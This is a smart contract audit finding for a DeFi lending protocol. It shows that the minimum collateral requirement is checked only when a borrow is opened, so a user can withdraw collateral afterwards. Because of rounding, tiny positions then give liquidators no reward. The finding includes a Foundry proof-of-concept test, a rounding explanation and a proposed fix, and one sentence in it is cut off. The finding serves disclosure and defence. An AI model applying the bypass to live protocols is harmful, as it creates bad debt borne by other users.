## The minimum collateral value can be bypassed, no liquidation incentive for 
   small borrows

## Summary 

`minimumCollateralValueForBorrowing` can be bypassed allowing for small position with small collateral.

## Details

A `minimumCollateralValueForBorrowing` is set at a base of 2500 usd. 
The reason for this value is to * help prevent saturation of the contract with small amounts of positions and to ensure that liquidating the position yields non-trivial rewards *. However this value can be bypassed if we the user if he withdraws the collateral after 

## POC

```sol
// SPDX-License-Identifier: BUSL 1.1
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";
import "../../price_feed/tests/ForcedPriceFeed.sol";


contract TestCollateral is Deployment
	{
	// User wallets for testing
    address public constant alice = address(0x1111);
    address public constant bob = address(0x2222);
    address public constant charlie = address(0x3333);

	bytes32 public collateralPoolID;


	constructor()
		{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();

		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);


		collateralPoolID = PoolUtils._poolID( wbtc, weth );

		// Mint some USDS to the DEPLOYER
		vm.prank( address(collateralAndLiquidity) );
		usds.mintTo( DEPLOYER, 2000000 ether );
		}


	function _userHasCollateral( address user ) internal view returns (bool)
		{
		return collateralAndLiquidity.userShareForPool( user, collateralPoolID ) > 0;
		}


	function _readyUser( address user ) internal
		{
		uint256 addedWBTC = 1000 * 10 ** 8 / 4;
		uint256 addedWETH = 1000000 ether / 4;

        // Deployer holds all the test tokens
		vm.startPrank( DEPLOYER );
		wbtc.transfer( user, addedWBTC );
		weth.transfer( user, addedWETH );
		vm.stopPrank();

//		console.log( "WBTC0: ", wbtc.balanceOf( user ) );

		vm.startPrank( user );
		wbtc.approve( address(collateralAndLiquidity), type(uint256).max );
        weth.approve( address(collateralAndLiquidity), type(uint256).max );
		usds.approve( address(collateralAndLiquidity), type(uint256).max );
		salt.approve( address(collateralAndLiquidity), type(uint256).max );
		usds.approve( address(collateralAndLiquidity), type(uint256).max );
		vm.stopPrank();
		}


    function setUp() public
    	{
    	_readyUser( DEPLOYER );
		_readyUser( alice );
		_readyUser( bob );
		_readyUser( charlie );
    	}


	// This will set the collateral / borrowed ratio at the default of 200%
	function _depositCollateralAndBorrowMax( address user ) internal
		{
		vm.startPrank( user );
		collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(user), weth.balanceOf(user), 0, block.timestamp, true );

		uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(user);
		collateralAndLiquidity.borrowUSDS( maxUSDS );
		vm.stopPrank();
		}


	// This will set the collateral / borrowed ratio at the default of 200%
	function _depositHalfCollateralAndBorrowMax( address user ) internal
		{
		vm.startPrank( user );
		collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(user) / 2, weth.balanceOf(user) / 2, 0, block.timestamp, true );

		uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(user);
		collateralAndLiquidity.borrowUSDS( maxUSDS );
		vm.stopPrank();
		}


	// Can be used to test liquidation by reducing BTC and ETH price.
	// Original collateral ratio is 200% with a minimum collateral ratio of 110%.
	// So dropping the prices by 46% should allow positions to be liquidated and still
	// ensure that the collateral is above water and able to be liquidated successfully.
	function _crashCollateralPrice() internal
		{
		vm.startPrank( DEPLOYER );
		forcedPriceFeed.setBTCPrice( forcedPriceFeed.getPriceBTC() * 54 / 100);
		forcedPriceFeed.setETHPrice( forcedPriceFeed.getPriceETH() * 54 / 100 );
			vm.stopPrank();
		}

    function test_edgeCase() public {
        		// Bob deposits collateral so alice can be liquidated
        vm.startPrank(bob);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(bob), weth.balanceOf(bob), 0, block.timestamp, false );
		vm.stopPrank();

		vm.startPrank( alice );
		uint256 wbtcDeposit = wbtc.balanceOf(alice) / 4;
		uint256 wethDeposit = weth.balanceOf(alice) / 4;

		collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtcDeposit, wethDeposit, 0, block.timestamp, true );

        // Alice borrows USDS
        // uint256 maxBorrowable = collateralAndLiquidity.maxBorrowableUSDS(alice);
        collateralAndLiquidity.borrowUSDS( 10 );
        uint256 withdrawAlice = collateralAndLiquidity.maxWithdrawableCollateral(alice);
        //withdraw max withdrawable ...
        console.log(withdrawAlice);
		vm.warp( block.timestamp + 1 days );

        collateralAndLiquidity.withdrawCollateralAndClaim(withdrawAlice, 0, 0, block.timestamp);

		uint256 aliceValue = collateralAndLiquidity.userCollateralValueInUSD( alice );
        console.log(aliceValue); 

    }

}

//COVERAGE="yes" NETWORK="sep" forge test --match-path src/stable/tests/WithdrawColl.t.sol -vvv --rpc-url

```

In this test we can see that we actually don't need to continually have 2500 usd worth of collateral, it is just needed when creating the borrow. Users can easely bypass this check. 
This added to the fact that if a position is below 20 weth and 20 wbtc (in wei), there will be no incentive to liquidate them. 
```
		uint256 rewardedWBTC = (reclaimedWBTC * rewardPercent) / 100; 
		uint256 rewardedWETH = (reclaimedWETH * rewardPercent) / 100; 

```
because 19 * 5 / 100 < 1, this will return 0. With gas costs, liquidators don't have any incentive to liquidate this position.

## impact

This way a lot of insignificant could be opened and flood the system, and generate bad debt amount.

## Recommended Mitigation Steps

Make sure that position that are actively borrowing need to have at least have `minimumCollateralValueForBorrowing`. Only when repaying the debt this collateral should be withdrawable. 


```diff
	function maxWithdrawableCollateral( address wallet ) public view returns (uint256)
		   ...

		// The maximum withdrawable value in USD
		uint256 maxWithdrawableValue = userCollateralValue - requiredCollateralValueAfterWithdrawal;
          ++    if(usdsBorrowedByUsers[wallet] > 0) return (userCollateralAmount *  maxWithdrawableValue / userCollateralValue ) - 
  `minimumCollateralValueForBorrowing`;
		// Return the collateralAmount that can be withdrawn
		return userCollateralAmount * maxWithdrawableValue / userCollateralValue;
   		}
```

This will minimize the borrow flood potential